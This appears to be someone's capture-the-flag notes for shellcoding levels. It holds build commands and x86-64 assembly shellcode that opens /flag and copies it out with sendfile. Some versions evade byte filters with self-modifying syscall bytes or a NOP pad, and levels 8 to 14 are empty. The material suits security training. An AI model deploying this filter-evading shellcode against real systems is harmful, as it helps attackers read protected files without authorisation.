# level
[x64.syscall.sh](https://x64.syscall.sh/): Your cheat sheet for syscalls. A glance here, and you're always ahead.

[syscalls manpage](https://man7.org/linux/man-pages/man2/syscalls.2.html): Understand not just the calls, but their deeper implications.

[felix cloutier](https://www.felixcloutier.com/x86/): Dive into the heartbeats of instructions, ensuring you're always in step.

[x86s reference](http://ref.x86s.net/coder64.html): Decode the bytes into moves, turning the tables on any challenge.

![图片](https://github.com/user-attachments/assets/38ff999a-07f2-4e20-be0b-c2b334a53c96)

![图片](https://github.com/user-attachments/assets/8fe712d1-8a9f-4666-a2d1-87269b321048)


```sh
# compile to elf
gcc -nostdlib -static shellcode.s -o sc-elf
```
```sh
# raw bytes
objcopy --dump-section .text=sc-raw sc-elf
```
```sh
# to debug
strace ./sc-elf
gdb ./sc-elf
```
![图片](https://github.com/user-attachments/assets/de1bf64d-7fd0-48af-bfdd-fa25089b2fbd)

```sh
gcc -nostdlib -static zzz.s -o yyy && objcopy --dump-section .text=xxx yyy
```

## 4
```s
.intel_syntax noprefix
.globl _start

.section .text

_start:

push 0x616c662f
mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
push rsp
pop rdi                     # mov rdi,rsp
push 0
pop rsi                     # xor rsi,rsi
push 2
pop rax                     # mov rax,2
syscall

push 1
pop rdi                     # mov rdi,1
push rax
pop rsi                     # mov rsi,rax
push 0
pop rdx                     # xor rdx,rdx
push 60
pop r10                     # mov r10,60
push 40
pop rax                     # mov rax,40
syscall

push 0
pop rdi                     # xor rdi,rdi
push 60
pop rax                     # mov rax,60
syscall

.section .data

```
## 5
```s
.intel_syntax noprefix
.globl _start
.section .text
_start:

# open("/flag",NULL)
push 0x616c662f
mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
push rsp
pop rdi                     # mov rdi,rsp
push 0
pop rsi                     # xor rsi,rsi
push 2
pop rax                     # mov rax,2
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

# sendfile(1,fd,0,60)
push 1
pop rdi                     # mov rdi,1
push rax
pop rsi                     # mov rsi,rax
push 0
pop rdx                     # xor rdx,rdx
push 60
pop r10                     # mov r10,60
push 40
pop rax                     # mov rax,40
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

# exit(0)
push 0                      
pop rdi                     # xor rdi,rdi
push 60
pop rax                     # mov rax,60
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

.section .data

```
## 6
```s
.intel_syntax noprefix
.globl _start
.section .text
_start:
# fill the r-x area
.rept 4096
    nop
.endr
# open("/flag",NULL)
push 0x616c662f
mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
push rsp
pop rdi                     # mov rdi,rsp
push 0
pop rsi                     # xor rsi,rsi
push 2
pop rax                     # mov rax,2
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

# sendfile(1,fd,0,60)
push 1
pop rdi                     # mov rdi,1
push rax
pop rsi                     # mov rsi,rax
push 0
pop rdx                     # xor rdx,rdx
push 60
pop r10                     # mov r10,60
push 40
pop rax                     # mov rax,40
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

# exit(0)
push 0                      
pop rdi                     # xor rdi,rdi
push 60
pop rax                     # mov rax,60
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

.section .data

```
## 7
把flag写到/tmp/fl里 
```s
.intel_syntax noprefix
.globl _start
.section .text
_start:

# open("/flag",NULL)
push 0x616c662f
mov dword ptr [rsp+4],0x67  # mov rbx,0x00000067616c662f; push rbx
push rsp
pop rdi                     # mov rdi,rsp
push 0
pop rsi                     # xor rsi,rsi
push 2
pop rax                     # mov rax,2
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall
mov rbx,rax

# open("/tmp/fl",O_WRONLY | O_CREAT,0666)
mov rax,0x6c662f706d742f
push rax
mov rdi,rsp
mov rsi,65
mov rdx,0666
mov rax,2
syscall

# sendfile(fd1,fd,0,60)
push rax
pop rdi                     # mov rdi,rax
push rbx
pop rsi                     # mov rsi,rbx
push 0
pop rdx                     # xor rdx,rdx
push 60
pop r10                     # mov r10,60
push 40
pop rax                     # mov rax,40
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

# exit(0)
push 0                      
pop rdi                     # xor rdi,rdi
push 60
pop rax                     # mov rax,60
inc byte ptr [rip]
.byte 0x0e,0x05             # syscall

.section .data

```
## 8
```s

```
## 9
```s

```
## 10
```s

```
## 11
```s

```
## 12
```s

```
## 13
```s

```
## 14
```s

```
